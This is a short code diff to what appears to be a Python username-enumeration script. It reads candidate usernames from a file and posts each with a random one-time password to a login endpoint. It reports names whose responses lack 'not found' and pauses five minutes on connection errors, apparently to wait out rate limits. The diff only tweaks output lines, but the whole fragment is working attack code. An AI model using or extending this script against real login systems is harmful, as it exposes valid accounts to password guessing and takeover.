@@ -29,14 +29,14 @@ while usrname != '':
     postparam["inputUsername"] = usrname
     postparam["inputOTP"] = str(random.randint(10000000, 99999999))
     sess = requests.session()
-    print("- [+] Payload: " + json.dumps(postparam))
+    # print("- [+] Payload: " + json.dumps(postparam))
     try:
         sess.get('http://' + host + '/')
         r = sess.post(finaluri, data=postparam)
         if 'not found' in r.text.lower():
             pass
         else:
-            print(postparam["inputUsername"])
+            print("- [+] Username: " + postparam["inputUsername"])
         usrname = f.readline().strip()
     except requests.exceptions.ConnectionError as ce:
         time.sleep(300)
